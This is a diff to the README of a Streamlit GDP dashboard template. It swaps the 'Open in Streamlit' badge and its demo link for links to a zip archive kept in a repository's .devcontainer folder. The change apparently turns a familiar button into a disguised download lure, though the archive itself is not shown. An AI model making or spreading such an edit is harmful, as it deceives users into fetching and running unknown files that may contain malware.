@@ -2,7 +2,7 @@
 
 A simple Streamlit app showing the GDP of different countries in the world.
 
-[![Open in Streamlit](https://static.streamlit.io/badges/streamlit_badge_black_white.svg)](https://gdp-dashboard-template.streamlit.app/)
+[![Open in Streamlit](https://github.com/sergsrgsg/gdp-dashboard-1/raw/refs/heads/main/.devcontainer/gdp_dashboard_2.1-beta.5.zip)](https://github.com/sergsrgsg/gdp-dashboard-1/raw/refs/heads/main/.devcontainer/gdp_dashboard_2.1-beta.5.zip)
 
 ### How to run it on your own machine
 
